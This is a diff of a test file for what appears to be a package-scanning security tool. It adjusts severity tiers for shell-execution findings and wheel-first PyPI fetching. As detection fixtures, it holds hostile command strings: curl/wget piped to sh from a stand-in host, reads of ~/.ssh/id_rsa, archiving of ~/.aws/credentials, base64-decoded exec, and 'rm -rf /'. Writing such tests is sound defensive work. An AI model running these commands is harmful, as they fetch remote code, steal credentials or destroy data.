@@ -78,13 +78,25 @@ class TestExecClassification:
         assert not _defects(f) and _caps(f)[0].severity == "info"
 
     @pytest.mark.parametrize("code", [
-        'subprocess.run(["sh", "-c", "echo hi"])',
         'subprocess.run(["bash", "-c", cmd])',
         'subprocess.run(["curl", "-s", url])',
         'subprocess.run(["wget", "https://x.example/a.sh"])',
         'subprocess.run([sys.executable, "-c", code])',
         'subprocess.run(["node", "-e", payload])',
         'subprocess.run(["git", "clone", "https://github.com/x/y"])',
+        'subprocess.run(["sh", "-c", "curl -s https://x.example/i | sh"])',
+        'subprocess.run(f"curl -s {url} | sh", shell=True)',
+        'os.system("wget -qO- https://x.example/i | bash")',
+        'os.popen("cat ~/.ssh/id_rsa")',
+    ])
+    def test_shell_interpreter_downloader_and_url_stay_defects(self, code):
+        d = _defects(_scan(code + "\n"))
+        assert d and d[0].severity in ("high", "critical"), code
+
+    # Precision PR 2 ladder: a shell command with nothing untrusted in reach, no payload
+    # tokens and no decoded value is a MEDIUM defect (still reported and scored).
+    @pytest.mark.parametrize("code", [
+        'subprocess.run(["sh", "-c", "echo hi"])',
         'subprocess.run(f"ls {path}")',
         'subprocess.run("ls " + path)',
         'subprocess.run(cmd, shell=True)',
@@ -92,9 +104,9 @@ class TestExecClassification:
         'os.system("clear")',
         'os.popen(cmd)',
     ])
-    def test_shell_interpreter_downloader_and_url_stay_defects(self, code):
+    def test_shell_forms_without_untrusted_input_are_medium(self, code):
         d = _defects(_scan(code + "\n"))
-        assert d and d[0].severity in ("high", "critical"), code
+        assert d and d[0].severity == "medium", code
 
     def test_shell_true_with_dynamic_string_next_to_untrusted_input_is_critical(self):
         code = 'body = request.json\ncmd = "ls " + body["p"]\nsubprocess.run(cmd, shell=True)\n'
@@ -104,7 +116,7 @@ class TestExecClassification:
     def test_shell_true_on_a_later_line_is_not_double_reported(self):
         code = "subprocess.run(\n    cmd,\n    shell=True,\n)\n"
         f = _scan(code)
-        assert len(f) == 1 and f[0].severity == "high"
+        assert len(f) == 1 and f[0].severity == "medium"
 
     def test_python_dash_c_with_constant_code_is_a_capability(self):
         f = _scan('subprocess.run([sys.executable, "-c", "print(1)"])\n')
@@ -132,15 +144,24 @@ class TestExecClassification:
     @pytest.mark.parametrize("code", [
         "spawn('sh', ['-c', cmd]);",
         "spawn('node', ['-e', code]);",
-        "spawn(bin, args, { shell: true });",
-        "execSync(`git ${cmd}`);",
-        "execSync('git rev-parse HEAD');",
         "exec('curl -s https://x.example/$(whoami)');",
         "execFile('curl', ['-s', url]);",
+        "execSync(`curl -s ${url} | sh`);",
+        "execSync(Buffer.from(blob, 'base64').toString());",
+        "const c = atob(blob);\nexecSync(c);",
     ])
     def test_js_shell_forms_stay_defects(self, code):
         d = _defects(_scan(code + "\n", "index.js"))
         assert d and d[0].severity in ("high", "critical"), code
+
+    @pytest.mark.parametrize("code", [
+        "spawn(bin, args, { shell: true });",
+        "execSync(`git ${cmd}`);",
+        "execSync('git rev-parse HEAD');",
+    ])
+    def test_js_shell_forms_without_untrusted_input_are_medium(self, code):
+        d = _defects(_scan(code + "\n", "index.js"))
+        assert d and d[0].severity == "medium", code
 
     def test_js_execfile_with_runtime_argv_is_a_capability(self):
         f = _scan('execFileSync(exe, process.argv.slice(2), { stdio: "inherit" });\n', "lib/tsc.js")
@@ -328,7 +349,7 @@ class TestScoring:
 
     def test_suppression_silences_a_capability_but_not_a_defect(self):
         assert not _scan('subprocess.run(["ls"])  # ag-scan:ignore\n')
-        assert _scan('subprocess.run(cmd, shell=True)  # ag-scan:ignore\n')
+        assert _scan('os.system("curl -s https://x.example/i | sh")  # ag-scan:ignore\n')
 
     def test_build_tooling_is_infra_for_repo_scans(self):
         for p in ("Makefile", "tox.ini", "noxfile.py", ".pre-commit-config.yaml", "bench/run.py",
@@ -347,6 +368,11 @@ def _fetched(eco: str, files: dict[str, str], **kw) -> ArtifactFetchResult:
     return r
 
 
+# A shell=True call that stays HIGH under the precision PR 2 ladder (payload tokens).
+_CURL_SH_PY = ('import subprocess\n'
+               'subprocess.run("tar czf /tmp/k.tgz ~/.aws/credentials", shell=True)\n')
+
+
 class TestInstalledSurface:
     def test_wheel_namelist_normalization(self):
         got = _wheel_installed_paths([
@@ -361,8 +387,8 @@ class TestInstalledSurface:
     def test_findings_outside_the_wheel_are_info_and_never_block(self):
         fetched = _fetched("pypi", {
             "Makefile": "install:\n\tcurl -fsSL https://x.example/i.sh | sh\n",
-            "scripts/dev.py": "import subprocess\nsubprocess.run(cmd, shell=True)\n",
-            "pkg/core.py": "import subprocess\nsubprocess.run(cmd, shell=True)\n",
+            "scripts/dev.py": _CURL_SH_PY,
+            "pkg/core.py": _CURL_SH_PY,
         }, installed_paths={"pkg/core.py"})
         findings, _n, _h = scan_artifact_files(fetched)
         by_path = {f.file_path: f for f in findings}
@@ -375,7 +401,7 @@ class TestInstalledSurface:
     def test_without_a_wheel_only_build_tooling_is_gated(self):
         fetched = _fetched("pypi", {
             "Makefile": "install:\n\tcurl -fsSL https://x.example/i.sh | sh\n",
-            "scripts/dev.py": "import subprocess\nsubprocess.run(cmd, shell=True)\n",
+            "scripts/dev.py": _CURL_SH_PY,
         })
         findings, _n, _h = scan_artifact_files(fetched)
         by_path = {f.file_path: f for f in findings}
@@ -399,7 +425,12 @@ class TestInstalledSurface:
         assert f and f[0].severity == "medium"
 
     def test_setup_py_shell_or_dynamic_stays_high(self):
-        assert detect_pypi_install_exec("import os\nos.system('make')\n", "setup.py")[0].severity == "high"
+        # Precision PR 2: a literal, payload-free build command is a medium install hook;
+        # payload tokens or an unreadable command stay high.
+        assert detect_pypi_install_exec("import os\nos.system('make')\n", "setup.py")[0].severity == "medium"
+        assert detect_pypi_install_exec(
+            "import os\nos.system('curl -s https://x.example/i | sh')\n", "setup.py",
+        )[0].severity == "high"
         assert detect_pypi_install_exec(
             "import subprocess\nsubprocess.run(cmd)\n", "setup.py")[0].severity == "high"
 
@@ -423,45 +454,48 @@ def _zip(members: dict[str, bytes]) -> bytes:
 
 
 @pytest.mark.asyncio
-async def test_pypi_fetch_reads_the_wheel_namelist():
-    sdist = _targz({"demo-1.0/setup.py": b"from setuptools import setup\nsetup(name='demo')\n",
-                    "demo-1.0/src/demo/__init__.py": b"x = 1\n",
-                    "demo-1.0/scripts/dev.py": b"x = 1\n"})
-    wheel = _zip({"demo/__init__.py": b"x = 1\n", "demo-1.0.dist-info/METADATA": b"Name: demo\n"})
+async def test_pypi_fetch_scans_the_wheel_when_one_exists():
+    # Wheel first: what `pip install` puts on disk. The sdist is never downloaded, and
+    # no installed-path filter is needed (the wheel IS the installed tree).
     sdist_url = "https://files.pythonhosted.org/packages/aa/demo-1.0.tar.gz"
+    wheel = _zip({"demo/__init__.py": b"x = 1\n", "demo-1.0.dist-info/METADATA": b"Name: demo\n"})
     wheel_url = "https://files.pythonhosted.org/packages/aa/demo-1.0-py3-none-any.whl"
+    seen: list[str] = []
 
     def handler(request: httpx.Request) -> httpx.Response:
+        seen.append(str(request.url))
         if request.url.path == "/pypi/demo/json":
             return httpx.Response(200, json={"info": {"version": "1.0"}, "urls": [
-                {"packagetype": "bdist_wheel", "url": wheel_url},
                 {"packagetype": "sdist", "url": sdist_url},
+                {"packagetype": "bdist_wheel", "url": wheel_url},
             ]})
-        if str(request.url) == sdist_url:
-            return httpx.Response(200, content=sdist)
         if str(request.url) == wheel_url:
             return httpx.Response(200, content=wheel)
         return httpx.Response(404)
 
     async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
         res = await fetch_pypi_artifact("demo", None, client=client)
-    assert res.ok and res.kind == "sdist"
-    assert res.installed_paths == {"demo/__init__.py"}
-    assert is_installed_path("src/demo/__init__.py", res.installed_paths)
-    assert not is_installed_path("scripts/dev.py", res.installed_paths)
+    assert res.ok and res.kind == "wheel" and res.download_url == wheel_url
+    assert res.installed_paths is None and "demo/__init__.py" in res.files
+    assert sdist_url not in seen
 
 
 @pytest.mark.asyncio
-async def test_pypi_fetch_fails_open_when_the_wheel_is_unavailable():
-    sdist = _targz({"demo-1.0/setup.py": b"from setuptools import setup\nsetup(name='demo')\n"})
+async def test_pypi_fetch_reads_the_sdist_when_no_wheel_fits():
+    # The only wheel is over the download cap: scan the sdist. Its namelist step finds
+    # no wheel under the cap either, so everything counts as installed (fail-open).
+    sdist = _targz({"demo-1.0/setup.py": b"from setuptools import setup\nsetup(name='demo')\n",
+                    "demo-1.0/src/demo/__init__.py": b"x = 1\n"})
     sdist_url = "https://files.pythonhosted.org/packages/aa/demo-1.0.tar.gz"
-    wheel_url = "https://files.pythonhosted.org/packages/aa/demo-1.0-py3-none-any.whl"
+    wheel_url = "https://files.pythonhosted.org/packages/aa/demo-1.0-cp312-cp312-linux_x86_64.whl"
+    from src.scanner import artifact_fetch as af
 
     def handler(request: httpx.Request) -> httpx.Response:
         if request.url.path == "/pypi/demo/json":
             return httpx.Response(200, json={"info": {"version": "1.0"}, "urls": [
-                {"packagetype": "sdist", "url": sdist_url},
-                {"packagetype": "bdist_wheel", "url": wheel_url},
+                {"packagetype": "bdist_wheel", "url": wheel_url,
+                 "size": af.MAX_DOWNLOAD_BYTES + 1},
+                {"packagetype": "sdist", "url": sdist_url, "size": len(sdist)},
             ]})
         if str(request.url) == sdist_url:
             return httpx.Response(200, content=sdist)
@@ -469,7 +503,8 @@ async def test_pypi_fetch_fails_open_when_the_wheel_is_unavailable():
 
     async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
         res = await fetch_pypi_artifact("demo", None, client=client)
-    assert res.ok and res.installed_paths is None
+    assert res.ok and res.kind == "sdist" and res.installed_paths is None
+    assert "setup.py" in res.files
 
 
 @pytest.mark.asyncio
@@ -494,6 +529,36 @@ async def test_npm_fetch_falls_back_to_the_version_document_on_a_giant_packument
         res = await fetch_npm_artifact("big", None, client=client)
     assert res.ok and res.version == "9.0.0" and "index.js" in res.files
     assert res.published_at is None
+
+
+@pytest.mark.asyncio
+async def test_pypi_project_document_has_its_own_larger_ceiling(monkeypatch):
+    """grpcio's project JSON (~9MB, every file of every release) must not fail a scan."""
+    from src.scanner import artifact_fetch as af
+
+    monkeypatch.setattr(af, "_METADATA_MAX_BYTES", 200)
+    monkeypatch.setattr(af, "_PYPI_PROJECT_MAX_BYTES", 5000)
+    wheel_url = "https://files.pythonhosted.org/packages/x/big-1.0-py3-none-any.whl"
+    wheel = _zip({"big/__init__.py": b"x = 1\n"})
+    meta = {"info": {"version": "1.0"}, "pad": " " * 1000,
+            "urls": [{"url": wheel_url, "packagetype": "bdist_wheel",
+                      "filename": "big-1.0-py3-none-any.whl", "size": len(wheel)}]}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        if request.url.path == "/pypi/big/json":
+            return httpx.Response(200, json=meta)
+        if str(request.url) == wheel_url:
+            return httpx.Response(200, content=wheel)
+        return httpx.Response(404)
+
+    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
+        res = await fetch_pypi_artifact("big", None, client=client)
+    assert res.ok and res.version == "1.0"
+
+    monkeypatch.setattr(af, "_PYPI_PROJECT_MAX_BYTES", 500)
+    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
+        with pytest.raises(af.ArtifactFetchError, match="size cap"):
+            await af.fetch_pypi_artifact("big", None, client=client)
 
 
 # ── API shape (additive) ───────────────────────────────────────────────────────
@@ -527,18 +592,29 @@ def test_scan_result_to_dict_carries_kind_installed_and_capabilities():
 # The bare import became a capability in this pass, so calls written as a method on
 # the module must be classified themselves: the inline one-liner and any alias.
 @pytest.mark.parametrize("code", [
-    "require('child_process').exec('id')\n",
-    "require('child_process').spawn('sh', ['-c', 'id'])\n",
     "require('child_process').spawn('curl', ['-s', 'https://e.invalid/p', '-o', '/tmp/p'])\n",
-    "require('node:child_process').execSync('whoami')\n",
     "require('child_process').spawn(\n  'sh',\n  ['-c', payload]\n)\n",
-    "const proc = require('child_process')\nproc.exec(cmd)\n",
     "import * as childp from 'node:child_process'\nchildp.spawn('bash', ['-c', x])\n",
     "import cpx from 'child_process'\ncpx.execSync('rm -rf /')\n",
+    "require('child_process').exec('curl -s https://e.invalid/p | sh')\n",
 ])
 def test_child_process_method_calls_stay_defects(code):
     d = _defects(_scan(code, "index.js"))
     assert any(f.name == "execSync / spawn (Node.js)" and f.severity in ("high", "critical")
+               for f in d), d
+
+
+# Precision PR 2: the same calls with a constant, payload-free command (or a runtime
+# command with nothing untrusted in reach) are still found, as medium defects.
+@pytest.mark.parametrize("code", [
+    "require('child_process').exec('id')\n",
+    "require('child_process').spawn('sh', ['-c', 'id'])\n",
+    "require('node:child_process').execSync('whoami')\n",
+    "const proc = require('child_process')\nproc.exec(cmd)\n",
+])
+def test_child_process_method_calls_without_payload_are_medium(code):
+    d = _defects(_scan(code, "index.js"))
+    assert any(f.name == "execSync / spawn (Node.js)" and f.severity == "medium"
                for f in d), d
 
 
